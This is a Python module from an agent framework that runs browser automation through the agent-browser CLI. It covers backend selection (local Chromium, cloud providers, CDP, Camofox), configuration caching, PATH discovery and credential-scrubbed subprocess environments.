#!/usr/bin/env python3
"""Browser automation tools driven by the agent-browser CLI.

Backends — local headless Chromium (default; ``agent-browser install
[--with-deps]`` one-time setup), Browser Use / Browserbase / Firecrawl cloud
(auto-detected from config + credentials), a user-supplied CDP endpoint, or
Camofox — share one agent-facing behaviour: per-task sessions, text snapshots
of the accessibility tree with ``@eN`` element refs, and automatic cleanup.

Env: BROWSERBASE_API_KEY / BROWSERBASE_PROJECT_ID / BROWSER_USE_API_KEY select
direct cloud credentials; BROWSERBASE_PROXIES (default "true"),
BROWSERBASE_ADVANCED_STEALTH ("false", Scale plan), BROWSERBASE_KEEP_ALIVE
("true", paid plan) and BROWSERBASE_SESSION_TIMEOUT (seconds, max 21600) tune
Browserbase sessions. Behavioural settings live under ``browser.*`` in config.yaml.

Sibling modules hold extracted clusters (eval policy, lightpanda fallback,
real-profile CDP, snapshot store); their names are re-imported here so
``patch("tools.browser_tool.X")`` keeps working.
"""

import atexit
import contextlib
import functools
import json
import logging
import os
import signal
import subprocess
import shutil
import sys
import tempfile
import threading
import time
from datetime import datetime, timezone
from typing import Dict, Any, Optional, List, Tuple, Union
from pathlib import Path
from agent.redact import redact_cdp_url
from hermes_constants import (
    agent_browser_runnable,
    get_hermes_home,
    get_hermes_home_override,
    hermes_home_key,
    node_tool_runnable,
    reset_hermes_home_override,
    set_hermes_home_override,
)
from utils import env_int, is_truthy_value
from hermes_cli.config import DEFAULT_CONFIG, cfg_get
from hermes_cli._subprocess_compat import windows_hide_flags


def __getattr__(name: str):
    """Lazy module attributes (PEP 562): ``requests`` and ``call_llm`` load on first use.

    First access binds the real object into module globals so the test-patch
    surface (``patch("tools.browser_tool.requests.get")`` / ``.call_llm``) works.
    """
    if name == "requests":
        import requests as _requests

        globals()["requests"] = _requests
        return _requests
    if name == "call_llm":
        from agent.auxiliary_client import call_llm as _call_llm

        globals()["call_llm"] = _call_llm
        return _call_llm
    raise AttributeError(f"module {__name__!r} has no attribute {name!r}")


def _lazy_call_llm(*args, **kwargs):
    """Invoke ``call_llm`` through module globals so test patches of
    ``tools.browser_tool.call_llm`` are honored, importing lazily otherwise."""
    fn = globals().get("call_llm")
    if fn is None:
        fn = __getattr__("call_llm")
    return fn(*args, **kwargs)

# Keys re-added to the agent-browser subprocess env AFTER credential stripping.
# agent-browser is a Node process loading npm deps: a compromised transitive
# dependency could read every Hermes secret from process.env, so only the
# browser-backend keys the worker legitimately needs pass through.
_BROWSER_PASSTHROUGH_KEYS: tuple[str, ...] = (
    "BROWSERBASE_API_KEY",
    "BROWSERBASE_PROJECT_ID",
    "BROWSER_USE_API_KEY",
    "FIRECRAWL_API_KEY",
    "FIRECRAWL_API_URL",
    "FIRECRAWL_BROWSER_TTL",
)


def _build_browser_env() -> dict:
    """Credential-scrubbed env for an agent-browser subprocess (only browser-backend keys re-added).

    The ``hermes_subprocess_env`` import is deferred so the module imports under
    test harnesses that stub the ``tools`` package.
    """
    from tools.environments.local import hermes_subprocess_env

    env = hermes_subprocess_env(inherit_credentials=False)
    for _key in _BROWSER_PASSTHROUGH_KEYS:
        if _key in os.environ:
            env[_key] = os.environ[_key]
    return env

try:
    from tools.website_policy import check_website_access
except Exception:
    check_website_access = lambda url: None  # noqa: E731 — fail-open if policy module unavailable

try:
    from tools.url_safety import (
        is_safe_url as _is_safe_url,
        is_always_blocked_url as _is_always_blocked_url,
        normalize_url_for_request as _normalize_url_for_request,
        sensitive_query_param_name as _sensitive_query_param_name,
    )
except Exception:
    _is_safe_url = lambda url: False  # noqa: E731 — fail-closed: block all if safety module unavailable
    _is_always_blocked_url = lambda url: True  # noqa: E731 — fail-closed on the floor too
    _normalize_url_for_request = lambda url: url  # noqa: E731 — best-effort fallback
    _sensitive_query_param_name = lambda url: None  # noqa: E731 — best-effort fallback
# Browser-provider ABC + registry. Per-vendor providers live under
# ``plugins/browser/<vendor>/``; the legacy class names are re-exported below as
# backward-compat shims for callers that import them from this module.
from agent.browser_provider import BrowserProvider as CloudBrowserProvider  # noqa: F401  (legacy alias)
from agent.browser_registry import (  # noqa: F401  (test-patchable surface)
    get_provider as _registry_get_browser_provider,
)
try:
    from agent.browser_registry import (
        registry_generation as _browser_registry_generation,
    )
except ImportError:
    # A few isolated compatibility tests intentionally install a minimal
    # ``agent.browser_registry`` stub exposing only ``get_provider``. Those
    # harnesses have no mutable registry, so a constant generation is exact.
    def _browser_registry_generation(*, scope=None):
        return (0, 0)
from plugins.browser.browserbase.provider import (  # noqa: F401  (legacy import surface)
    BrowserbaseBrowserProvider as BrowserbaseProvider,
)
from plugins.browser.browser_use.provider import (  # noqa: F401
    BrowserUseBrowserProvider as BrowserUseProvider,
)
from plugins.browser.firecrawl.provider import (  # noqa: F401
    FirecrawlBrowserProvider as FirecrawlProvider,
)
from tools.tool_backend_helpers import normalize_browser_cloud_provider
# Camofox local anti-detection browser backend (optional).
# When CAMOFOX_URL is set, all browser operations route through the
# camofox REST API instead of the agent-browser CLI.
try:
    from tools.browser_camofox import is_camofox_mode as _is_camofox_mode
except ImportError:
    _is_camofox_mode = lambda: False  # noqa: E731
# Browser Use CLI (optional)
try:
    from tools.browser_use_cli import is_browser_use_cli_mode as _is_browser_use_cli_mode
except ImportError:
    _is_browser_use_cli_mode = lambda: False  # noqa: E731

logger = logging.getLogger(__name__)

# Standard PATH entries for environments with minimal PATH (e.g. systemd services).
# Includes Android/Termux and macOS Homebrew locations needed for agent-browser,
# npx, node, and Android's glibc runner (grun).
_SANE_PATH_DIRS = (
    "/data/data/com.termux/files/usr/bin",
    "/data/data/com.termux/files/usr/sbin",
    "/opt/homebrew/bin",
    "/opt/homebrew/sbin",
    "/usr/local/sbin",
    "/usr/local/bin",
    "/usr/sbin",
    "/usr/bin",
    "/sbin",
    "/bin",
)
_SANE_PATH = os.pathsep.join(_SANE_PATH_DIRS)


@functools.lru_cache(maxsize=1)
def _discover_homebrew_node_dirs() -> tuple[str, ...]:
    """Find Homebrew versioned Node.js bin directories (e.g. node@20, node@24).

    When Node is installed via ``brew install node@24`` and NOT linked into
    /opt/homebrew/bin, agent-browser isn't discoverable on the default PATH.
    This function finds those directories so they can be prepended.
    """
    dirs: list[str] = []
    homebrew_opt = "/opt/homebrew/opt"
    if not os.path.isdir(homebrew_opt):
        return tuple(dirs)
    try:
        for entry in os.listdir(homebrew_opt):
            if entry.startswith("node") and entry != "node":
                bin_dir = os.path.join(homebrew_opt, entry, "bin")
                if os.path.isdir(bin_dir):
                    dirs.append(bin_dir)
    except OSError:
        pass
    return tuple(dirs)


def _browser_candidate_path_dirs() -> list[str]:
    """Return ordered browser CLI PATH candidates shared by discovery and execution."""
    hermes_home = get_hermes_home()
    hermes_node_bin = str(hermes_home / "node" / "bin")
    hermes_node_root = str(hermes_home / "node")
    hermes_nm_bin = str(hermes_home / "node_modules" / ".bin")
    return [hermes_node_bin, hermes_node_root, hermes_nm_bin, *list(_discover_homebrew_node_dirs()), *_SANE_PATH_DIRS]


def _merge_browser_path(existing_path: str = "") -> str:
    """Prepend browser-specific PATH fallbacks without reordering existing entries."""
    path_parts = [p for p in (existing_path or "").split(os.pathsep) if p]
    existing_parts = set(path_parts)
    prefix_parts: list[str] = []

    for part in _browser_candidate_path_dirs():
        if not part or part in existing_parts or part in prefix_parts:
            continue
        if os.path.isdir(part):
            prefix_parts.append(part)

    return os.pathsep.join(prefix_parts + path_parts)

# Throttle screenshot cleanup to avoid repeated full directory scans.
_last_screenshot_cleanup_by_dir: dict[str, float] = {}

# ============================================================================
# Configuration
# ============================================================================

# Default timeout for browser commands (seconds)
DEFAULT_COMMAND_TIMEOUT = 30

# Floor for ``open`` (navigate) — cold daemon + first Chromium launch can exceed
# the generic command_timeout on slow or library-starved Linux hosts.
MIN_OPEN_TIMEOUT = 60
MIN_FIRST_OPEN_TIMEOUT = 120

# Default max chars for snapshot content before truncation. Aligned with
# web_tools.DEFAULT_EXTRACT_CHAR_LIMIT (15000) — the snapshot and
# web_extract paths share the same truncate-and-store pattern, so the model
# gets the same per-page budget from both. Configurable via
# ``browser.snapshot_threshold`` in config.yaml.
DEFAULT_SNAPSHOT_THRESHOLD = 15000
MIN_SNAPSHOT_THRESHOLD = 1000

# Backwards-compatible import surface. Runtime call sites use
# ``get_browser_snapshot_threshold()`` so config overrides take effect.
SNAPSHOT_SUMMARIZE_THRESHOLD = DEFAULT_SNAPSHOT_THRESHOLD

# Hard ceiling on the full-snapshot file written to cache/web when a snapshot
# is truncated. Mirrors web_tools.MAX_STORED_TEXT_CHARS —
# the model only ever sees the truncated view; the stored copy exists for
# read_file paging and must not write unbounded bytes to disk.
MAX_STORED_SNAPSHOT_CHARS = 2_000_000

# Commands that legitimately return empty stdout (e.g. close, record).
_EMPTY_OK_COMMANDS: frozenset = frozenset({"close", "record"})

_cached_command_timeout: Optional[int] = None
_command_timeout_resolved = False
_cached_snapshot_threshold: Optional[int] = None
_snapshot_threshold_resolved = False


def _sanitize_url_for_logs(value: object) -> str:
    """Mask secrets in logged CDP URLs; :func:`agent.redact.redact_cdp_url` is the single policy."""
    return redact_cdp_url(value)


def _browser_cfg(key: str, default, parse, log_label: str):
    """Read ``browser.<key>`` from the raw profile config and ``parse`` it.

    Returns ``default`` when the key is absent, the section is not a mapping,
    or reading/parsing raises (logged at debug as "Could not read <log_label>").
    Raw config is used so tool JSON output is not affected by loader warnings.
    """
    try:
        from hermes_cli.config import read_raw_config
        browser_cfg = read_raw_config().get("browser", {})
        if isinstance(browser_cfg, dict) and key in browser_cfg:
            return parse(browser_cfg[key])
    except Exception as e:
        logger.debug("Could not read %s: %s", log_label, e)
    return default


def _get_command_timeout() -> int:
    """Return ``browser.command_timeout`` (floored at 5s; default 30s).

    Cached after the first call and cleared by ``cleanup_all_browsers()``.
    """
    global _cached_command_timeout, _command_timeout_resolved
    if _command_timeout_resolved and _cached_command_timeout is not None:
        return _cached_command_timeout

    result = _browser_cfg(
        "command_timeout", DEFAULT_COMMAND_TIMEOUT,
        lambda v: DEFAULT_COMMAND_TIMEOUT if v is None else max(int(v), 5),
        "command_timeout from config",
    )
    # Assign the cached value BEFORE flipping the resolved flag so a
    # concurrent reader cannot observe ``resolved=True`` with a ``None`` cache.
    _cached_command_timeout = result
    _command_timeout_resolved = True
    return result


def _safe_command_timeout() -> int:
    """``_get_command_timeout`` guaranteed non-None (cache reset mid-flight).

    Uses ``is not None`` rather than ``or`` so a configured ``0`` is preserved.
    """
    val = _get_command_timeout()
    return val if val is not None else DEFAULT_COMMAND_TIMEOUT


def get_browser_snapshot_threshold() -> int:
    """Return ``browser.snapshot_threshold`` (floored at MIN_SNAPSHOT_THRESHOLD).

    Cached for the browser lifecycle and reset by :func:`cleanup_all_browsers`.
    """
    global _cached_snapshot_threshold, _snapshot_threshold_resolved
    if _snapshot_threshold_resolved and _cached_snapshot_threshold is not None:
        return _cached_snapshot_threshold

    result = _browser_cfg(
        "snapshot_threshold", DEFAULT_SNAPSHOT_THRESHOLD,
        lambda v: DEFAULT_SNAPSHOT_THRESHOLD if v is None else max(int(v), MIN_SNAPSHOT_THRESHOLD),
        "browser.snapshot_threshold",
    )
    # Same race-safety invariant as the command-timeout cache.
    _cached_snapshot_threshold = result
    _snapshot_threshold_resolved = True
    return result


def _get_open_command_timeout(*, first_open: bool = False) -> int:
    """Timeout for agent-browser ``open`` (navigation / daemon cold start)."""
    base = _safe_command_timeout()
    floor = MIN_FIRST_OPEN_TIMEOUT if first_open else MIN_OPEN_TIMEOUT
    return max(base, floor)


def _needs_chromium_sandbox_bypass() -> bool:
    """Return True when Chromium needs --no-sandbox to start reliably."""
    if hasattr(os, "geteuid") and os.geteuid() == 0:
        return True
    if _running_in_docker():
        return True
    userns_restrict = "/proc/sys/kernel/apparmor_restrict_unprivileged_userns"
    try:
        with open(userns_restrict, encoding="utf-8") as f:
            if f.read().strip() == "1":
                return True
    except OSError:
        pass
    return False


def _apply_chromium_sandbox_args(browser_env: Dict[str, str]) -> None:
    """Add required Chromium sandbox flags without overriding user settings."""
    if (
        "AGENT_BROWSER_ARGS" not in browser_env
        and "AGENT_BROWSER_CHROME_FLAGS" not in browser_env
        and _needs_chromium_sandbox_bypass()
    ):
        logger.debug(
            "browser: sandbox bypass needed (root/docker/AppArmor userns) — "
            "injecting --no-sandbox"
        )
        browser_env["AGENT_BROWSER_ARGS"] = "--no-sandbox,--disable-dev-shm-usage"


def _read_command_output_files(stdout_path: str, stderr_path: str) -> tuple[str, str]:
    """Best-effort read of agent-browser stdout/stderr temp files."""
    stdout = stderr = ""
    for path, slot in ((stdout_path, "stdout"), (stderr_path, "stderr")):
        try:
            with open(path, "r", encoding="utf-8") as f:
                text = f.read().strip()
        except OSError:
            continue
        if slot == "stdout":
            stdout = text
        else:
            stderr = text
    return stdout, stderr


def _unlink_command_output_files(*paths: str) -> None:
    for path in paths:
        try:
            os.unlink(path)
        except OSError:
            pass


def _format_browser_timeout_error(
    command: str,
    timeout: int,
    stdout: str,
    stderr: str,
) -> str:
    """Build an actionable timeout message from captured daemon output."""
    parts = [f"Command timed out after {timeout} seconds"]
    detail = (stderr or stdout or "").strip()
    if detail:
        parts.append(detail[:1500])

    combined = f"{stderr}\n{stdout}".lower()
    hints: list[str] = []
    if "sandbox" in combined:
        hints.append(
            "Chromium sandbox launch failed. Set AGENT_BROWSER_ARGS="
            "'--no-sandbox,--disable-dev-shm-usage' in your environment, "
            "or run: npx agent-browser install --with-deps"
        )
    elif command == "open" and _is_local_mode():
        if _running_in_docker():
            hints.append(
                "The browser daemon may still be starting or Chromium may be "
                "missing. Pull the latest image: "
                "docker pull ghcr.io/nousresearch/hermes-agent:latest"
            )
        else:
            hints.append(
                "The browser daemon may still be starting, or Chromium may be "
                "missing system libraries. Install/repair with: "
                "npx agent-browser install --with-deps "
                "(or: npx playwright install --with-deps chromium)"
            )
    if hints:
        parts.extend(hints)
    return "\n".join(parts)


def _get_vision_model() -> Optional[str]:
    """Model for browser_vision (screenshot analysis — multimodal)."""
    return os.getenv("AUXILIARY_VISION_MODEL", "").strip() or None


def _resolve_cdp_override(cdp_url: str) -> str:
    """Normalize a user-supplied CDP endpoint into a concrete websocket URL.

    Full ``ws://.../devtools/browser/...`` endpoints pass through; HTTP
    discovery roots and bare ``ws://host:port`` are resolved via
    ``/json/version`` → ``webSocketDebuggerUrl`` (falls back to the raw value
    with a warning if discovery fails).
    """
    raw = (cdp_url or "").strip()
    if not raw:
        return ""

    lowered = raw.lower()
    if "/devtools/browser/" in lowered:
        return raw

    discovery_url = raw
    if lowered.startswith(("ws://", "wss://")):
        if raw.count(":") == 2 and raw.rstrip("/").rsplit(":", 1)[-1].isdigit() and "/" not in raw.split(":", 2)[-1]:
            discovery_url = ("http://" if lowered.startswith("ws://") else "https://") + raw.split("://", 1)[1]
        else:
            return raw

    if discovery_url.lower().endswith("/json/version"):
        version_url = discovery_url
    else:
        version_url = discovery_url.rstrip("/") + "/json/version"

    try:
        import requests  # lazy — shared module object, test patches still apply

        response = requests.get(version_url, timeout=10)
        response.raise_for_status()
        payload = response.json()
    except Exception as exc:
        logger.warning(
            "Failed to resolve CDP endpoint %s via %s: %s",
            _sanitize_url_for_logs(raw),
            _sanitize_url_for_logs(version_url),
            _sanitize_url_for_logs(exc),
        )
        return raw

    ws_url = str(payload.get("webSocketDebuggerUrl") or "").strip()
    if ws_url:
        logger.info(
            "Resolved CDP endpoint %s -> %s",
            _sanitize_url_for_logs(raw),
            _sanitize_url_for_logs(ws_url),
        )
        return ws_url

    logger.warning(
        "CDP discovery at %s did not return webSocketDebuggerUrl; using raw endpoint",
        _sanitize_url_for_logs(version_url),
    )
    return raw


def _get_cdp_override_raw() -> str:
    """Return the *configured* CDP override without any network I/O.

    Precedence: ``BROWSER_CDP_URL`` env (live ``/browser connect`` override),
    then ``browser.cdp_url`` in config.yaml. Callers that only need to know
    *whether* an override exists (check_fn gates, ``_is_local_mode`` /
    ``_is_local_backend``, ``hermes doctor``) MUST use this, not
    :func:`_get_cdp_override`: that one does a 10s HTTP discovery, and a stale
    ``cdp_url`` pointing at a dead Chrome would stall every startup's schema
    build with no error — no side effects during schema build.
    """
    env_override = os.environ.get("BROWSER_CDP_URL", "").strip()
    if env_override:
        return env_override
    return _browser_cfg(
        "cdp_url", "", lambda v: str(v or "").strip(), "browser.cdp_url from config"
    )


def _get_cdp_override() -> str:
    """Return the resolved CDP URL override, or "" (skips cloud AND local launch).

    May perform an HTTP ``/json/version`` discovery request — only call on
    paths about to *connect* (session creation, supervisor attach); pure
    is-it-configured gates must use :func:`_get_cdp_override_raw`.
    """
    raw = _get_cdp_override_raw()
    if not raw:
        return ""
    return _resolve_cdp_override(raw)


def _get_dialog_policy_config() -> Tuple[str, float]:
    """Read ``browser.dialog_policy`` + ``browser.dialog_timeout_s`` from config.

    Returns a ``(policy, timeout_s)`` tuple, falling back to the supervisor's
    defaults when keys are absent or invalid.
    """
    # Defer imports so browser_tool can be imported in minimal environments.
    from tools.browser_supervisor import (
        DEFAULT_DIALOG_POLICY,
        DEFAULT_DIALOG_TIMEOUT_S,
        _VALID_POLICIES,
    )

    try:
        from hermes_cli.config import read_raw_config

        cfg = read_raw_config()
        browser_cfg = cfg.get("browser", {}) if isinstance(cfg, dict) else {}
        if not isinstance(browser_cfg, dict):
            return DEFAULT_DIALOG_POLICY, DEFAULT_DIALOG_TIMEOUT_S
        policy = str(browser_cfg.get("dialog_policy") or DEFAULT_DIALOG_POLICY)
        if policy not in _VALID_POLICIES:
            logger.debug("Invalid browser.dialog_policy=%r; using default", policy)
            policy = DEFAULT_DIALOG_POLICY
        timeout_raw = browser_cfg.get("dialog_timeout_s")
        try:
            timeout_s = float(timeout_raw) if timeout_raw is not None else DEFAULT_DIALOG_TIMEOUT_S
            if timeout_s <= 0:
                timeout_s = DEFAULT_DIALOG_TIMEOUT_S
        except (TypeError, ValueError):
            timeout_s = DEFAULT_DIALOG_TIMEOUT_S
        return policy, timeout_s
    except Exception:
        return DEFAULT_DIALOG_POLICY, DEFAULT_DIALOG_TIMEOUT_S


def _ensure_cdp_supervisor(task_id: str) -> None:
    """Start a CDP supervisor for ``task_id`` if an endpoint is reachable.

    Idempotent (``SupervisorRegistry.get_or_start`` skips an existing
    ``(task_id, cdp_url)`` and restarts on URL change), so safe on every
    navigate / ``/browser connect``. URL precedence: the CDP override, then the
    session's own ``cdp_url`` (cloud providers). Swallows all errors — a failed
    attach must not break the session; snapshots just lack
    ``pending_dialogs`` / ``frame_tree``.
    """
    cdp_url = _get_cdp_override()
    if not cdp_url:
        # Fallback: active session may carry a per-session CDP URL from a
        # cloud provider (Browserbase sets this).
        with _cleanup_lock:
            session_info = _active_sessions.get(task_id, {})
        maybe = str(session_info.get("cdp_url") or "")
        if maybe:
            cdp_url = _resolve_cdp_override(maybe)
    if not cdp_url:
        return
    try:
        from tools.browser_supervisor import SUPERVISOR_REGISTRY  # type: ignore[import-not-found]

        policy, timeout_s = _get_dialog_policy_config()
        SUPERVISOR_REGISTRY.get_or_start(
            task_id=task_id,
            cdp_url=cdp_url,
            dialog_policy=policy,
            dialog_timeout_s=timeout_s,
        )
    except Exception as exc:
        logger.debug(
            "CDP supervisor attach for task=%s failed (non-fatal): %s",
            task_id,
            exc,
        )


def _stop_cdp_supervisor(task_id: str) -> None:
    """Stop the CDP supervisor for ``task_id`` if one exists. No-op otherwise."""
    try:
        from tools.browser_supervisor import SUPERVISOR_REGISTRY  # type: ignore[import-not-found]

        SUPERVISOR_REGISTRY.stop(task_id)
    except Exception as exc:
        logger.debug("CDP supervisor stop for task=%s failed (non-fatal): %s", task_id, exc)


# ============================================================================
# Cloud Provider Registry
# ============================================================================
#
# Per-vendor providers live as plugins under ``plugins/browser/<vendor>/`` and
# self-register with :mod:`agent.browser_registry`, which is what
# ``_get_cloud_provider()`` consults. The legacy class-name dict below is a
# backward-compat shim: when a test monkeypatches it, it is honoured;
# otherwise the registry-backed path wins.

_PROVIDER_REGISTRY: Dict[str, type] = {
    "browserbase": BrowserbaseProvider,
    "browser-use": BrowserUseProvider,
    "firecrawl": FirecrawlProvider,
}
# Frozen copy of the import-time _PROVIDER_REGISTRY, used by
# ``_is_legacy_provider_registry_overridden`` to detect test-time
# monkeypatching. NEVER mutate this dict.
_DEFAULT_PROVIDER_REGISTRY: Dict[str, type] = dict(_PROVIDER_REGISTRY)

_cached_cloud_provider: Optional[CloudBrowserProvider] = None
_cloud_provider_resolved = False
_cached_cloud_provider_scope: Optional[str] = None
_cached_cloud_providers: Dict[
    tuple[str, tuple[int, int]], Optional[CloudBrowserProvider]
] = {}
_cloud_provider_cache_lock = threading.RLock()
_allow_private_urls_resolved = False
_cached_allow_private_urls: Optional[bool] = None
_cached_agent_browser: Optional[str] = None
_agent_browser_resolved = False

# Lightpanda engine support — cached like _get_cloud_provider().
# agent-browser v0.25.3+ supports ``--engine lightpanda`` natively.
_cached_browser_engine: Optional[str] = None
_browser_engine_resolved = False


def _is_legacy_provider_registry_overridden() -> bool:
    """True when a test has patched ``_PROVIDER_REGISTRY`` to a custom value.

    Each registered value is compared by identity against the canonical class
    in ``_DEFAULT_PROVIDER_REGISTRY`` (extra keys count too); adding a built-in
    provider only requires extending that default dict.
    """
    try:
        for key, default_cls in _DEFAULT_PROVIDER_REGISTRY.items():
            if _PROVIDER_REGISTRY.get(key) is not default_cls:
                return True
        # Extra keys not in the default registry → also an override.
        return len(_PROVIDER_REGISTRY) != len(_DEFAULT_PROVIDER_REGISTRY)
    except Exception:
        return False


def _ensure_browser_plugins_loaded() -> None:
    """Idempotently trigger plugin discovery so the browser registry is populated.

    ``model_tools`` normally does this as an import side effect, but
    ``_get_cloud_provider`` is also reached from standalone scripts and test
    harnesses that never import it; cheap on repeat calls.
    """
    try:
        from hermes_cli.plugins import _ensure_plugins_discovered

        _ensure_plugins_discovered()
    except Exception as exc:
        logger.debug("Browser plugin discovery failed (non-fatal): %s", exc)


def _get_cloud_provider() -> Optional[CloudBrowserProvider]:
    """Return the provider cached for the active Hermes profile."""
    global _cached_cloud_provider, _cloud_provider_resolved
    global _cached_cloud_provider_scope

    scope = hermes_home_key()
    with _cloud_provider_cache_lock:
        # Tests and legacy reset paths clear the boolean. Treat that as a full
        # reset even if a previous scoped resolution remains mirrored here.
        if not _cloud_provider_resolved:
            _cached_cloud_provider_scope = None
            _cached_cloud_providers.clear()
        while True:
            before_generation = _browser_registry_generation(scope=scope)
            cache_key = (scope, before_generation)
            if cache_key in _cached_cloud_providers:
                _cached_cloud_provider = _cached_cloud_providers[cache_key]
                _cloud_provider_resolved = True
                _cached_cloud_provider_scope = scope
                return _cached_cloud_provider

            _cached_cloud_provider = None
            _cloud_provider_resolved = False
            resolved = _resolve_cloud_provider_uncached()
            after_generation = _browser_registry_generation(scope=scope)
            if before_generation != after_generation:
                # A force reload replaced/unloaded this profile's provider
                # while resolution was in progress. Discard the stale result
                # and resolve against the new registry generation.
                continue
            if _cloud_provider_resolved:
                _cached_cloud_provider_scope = scope
                for stale_key in [
                    key for key in _cached_cloud_providers if key[0] == scope
                ]:
                    _cached_cloud_providers.pop(stale_key, None)
                _cached_cloud_providers[cache_key] = resolved
            return resolved


def _instantiate_explicit_cloud_provider(provider_key: str) -> Optional[CloudBrowserProvider]:
    """Build the provider named by ``browser.cloud_provider``.

    Test fixtures that patch ``_PROVIDER_REGISTRY`` drive the legacy dict;
    otherwise the plugin registry is consulted (after idempotent discovery).
    Strict selection: a stored-but-unregistered name raises ``ValueError``
    (never a silent reroute to auto-detect). Any other instantiation error is
    logged and yields None so the next call retries.
    """
    try:
        if _is_legacy_provider_registry_overridden():
            factory = _PROVIDER_REGISTRY.get(provider_key)
            resolved = factory() if factory is not None else None
        else:
            _ensure_browser_plugins_loaded()
            resolved = _registry_get_browser_provider(provider_key)
        if resolved is None:
            from tools.tool_backend_helpers import selection_error

            raise ValueError(selection_error(
                "browser",
                f"'{provider_key}'",
                "no registered browser plugin has that name (install "
                "the corresponding plugin or fix the config key "
                "spelling)",
            ))
        return resolved
    except ValueError:
        raise
    except Exception:
        logger.warning(
            "Failed to instantiate explicit cloud_provider %r; will retry on next call",
            provider_key,
            exc_info=True,
        )
        return None


def _autodetect_cloud_provider() -> Optional[CloudBrowserProvider]:
    """Auto-detect: Browser Use (managed Nous gateway or API key), then Browserbase.

    Uses the legacy class names bound on this module so tests that
    ``monkeypatch.setattr(browser_tool, "BrowserUseProvider", ...)`` keep
    driving this branch. Third-party plugins are intentionally NOT reachable
    from auto-detect — only via explicit ``browser.cloud_provider: <name>``.
    Never raises (a failure must not poison the cache).
    """
    try:
        for cls in (BrowserUseProvider, BrowserbaseProvider):
            fallback_provider = cls()
            if fallback_provider.is_configured():
                return fallback_provider
    except Exception:  # pragma: no cover - defensive: never poison cache
        logger.debug("Cloud provider auto-detect failed", exc_info=True)
    return None


def _resolve_cloud_provider_uncached() -> Optional[CloudBrowserProvider]:
    """Return the configured cloud browser provider, or None for local mode.

    Reads ``browser.cloud_provider`` and pins the result in the cache only when
    it is definitive (explicit ``local``/``camofox``, or a resolved provider).
    Explicit selection routes through :mod:`agent.browser_registry` so
    third-party plugins participate; auto-detect (only when no selection was
    ever written) walks Browser Use then Browserbase. A transient None
    (unreadable config, missing credentials) is NOT cached so it can self-heal.
    """
    global _cached_cloud_provider, _cloud_provider_resolved

    resolved: Optional[CloudBrowserProvider] = None
    provider_key = None
    try:
        from hermes_cli.config import read_raw_config
        browser_cfg = read_raw_config().get("browser", {})
        if isinstance(browser_cfg, dict) and "cloud_provider" in browser_cfg:
            provider_key = normalize_browser_cloud_provider(browser_cfg.get("cloud_provider"))
            if provider_key in ("local", "camofox"):
                # Camofox runs through the built-in browser tools, not a cloud provider.
                _cached_cloud_provider = None
                _cloud_provider_resolved = True
                return None
            if provider_key == "nous":
                # Managed "Nous Subscription" is serviced by the Browser Use provider.
                provider_key = "browser-use"
        if provider_key:
            resolved = _instantiate_explicit_cloud_provider(provider_key)
            if resolved is None:
                return None
    except ValueError:
        raise
    except Exception as e:
        # Config may be temporarily unreadable; still try auto-detect so
        # env-based / managed-gateway credentials can resolve. Don't pin cache.
        logger.debug("Could not read cloud_provider from config: %s", e)

    if resolved is None and provider_key is None:
        resolved = _autodetect_cloud_provider()
    if resolved is None:
        return None

    _cached_cloud_provider = resolved
    _cloud_provider_resolved = True
    return _cached_cloud_provider


from hermes_constants import is_termux as _is_termux_environment


def _browser_install_hint() -> str:
    if _is_termux_environment():
        return "npm install -g agent-browser && agent-browser install"
    return "npm install -g agent-browser && agent-browser install --with-deps"


# Sentinel _find_agent_browser returns/caches to mean "resolve via npx" rather
# than a concrete executable path. A named constant + predicate keep the six
# comparison sites (four here, plus hermes_cli/tools_config.py and
# hermes_cli/doctor.py) from drifting if the sentinel's exact spelling ever
# changes.
NPX_AGENT_BROWSER_SENTINEL = "npx agent-browser"

# Pinned to match scripts/install.sh / scripts/install.ps1's
# "agent-browser@^0.26.0" managed install so a git-clone install resolving
# agent-browser via bare npx gets the same version as a managed install,
# instead of floating latest with no integrity check. Update both together.
AGENT_BROWSER_NPX_SPEC = "agent-browser@^0.26.0"


def _is_npx_agent_browser_sentinel(browser_cmd: str) -> bool:
    return browser_cmd.strip() == NPX_AGENT_BROWSER_SENTINEL


def _requires_real_termux_browser_install(browser_cmd: str) -> bool:
    return _is_termux_environment() and _is_local_mode() and _is_npx_agent_browser_sentinel(browser_cmd)


def _termux_browser_install_error() -> str:
    return (
        "Local browser automation on Termux cannot rely on the bare npx fallback. "
        f"Install agent-browser explicitly first: {_browser_install_hint()}"
    )


def _is_local_mode() -> bool:
    """Return True when the browser tool will use a local browser backend."""
    if _get_cdp_override_raw():
        return False
    return _get_cloud_provider() is None


def _is_local_backend() -> bool:
    """Return True when the browser runs locally AND the terminal is also local.

    SSRF protection only matters when the browser can reach networks the user's
    terminal cannot: cloud backends, and a local browser paired with a
    containerized terminal (docker/modal/daytona/ssh/singularity). A CDP
    override is never trusted as local (that Chrome may live off-host) and MUST
    be checked before the Camofox short-circuit so Camofox + override still
    fails the local check; ``_is_local_mode`` treats overrides the same way —
    keep the two in agreement.
    """
    if _get_cdp_override_raw():
        return False
    if _is_camofox_mode():
        return True
    if _get_cloud_provider() is not None:
        return False
    # Scope-aware: under gateway multiplexing the routed profile's terminal
    # backend lives in the per-turn terminal scope, not the process env.
    from tools.terminal_scope import terminal_env

    terminal_backend = terminal_env("TERMINAL_ENV", "local").strip().lower()
    return terminal_backend in ("local", "")


_auto_local_for_private_urls_resolved = False
_cached_auto_local_for_private_urls: bool = True


def _get_browser_engine() -> str:
    """Return the browser engine: ``auto`` (no ``--engine`` flag), ``lightpanda`` or ``chrome``.

    ``browser.engine`` first, then ``AGENT_BROWSER_ENGINE``, then ``auto``;
    cached. Lightpanda is much faster on navigation but has no graphical
    renderer (no screenshots).
    """
    global _cached_browser_engine, _browser_engine_resolved
    if _browser_engine_resolved:
        return _cached_browser_engine

    _browser_engine_resolved = True
    # Config file takes priority; env var only if config didn't set a value.
    _cached_browser_engine = _browser_cfg(
        "engine", "auto",
        lambda v: str(v).strip().lower() if v and str(v).strip() else "auto",
        "browser.engine from config",
    )
    if _cached_browser_engine == "auto":
        env_val = os.environ.get("AGENT_BROWSER_ENGINE", "").strip().lower()
        if env_val:
            _cached_browser_engine = env_val

    # Validate: agent-browser only accepts "chrome" and "lightpanda".
    _VALID_ENGINES = {"auto", "lightpanda", "chrome"}
    if _cached_browser_engine not in _VALID_ENGINES:
        logger.warning(
            "Unknown browser engine %r (valid: %s), falling back to 'auto'",
            _cached_browser_engine, ", ".join(sorted(_VALID_ENGINES)),
        )
        _cached_browser_engine = "auto"

    return _cached_browser_engine


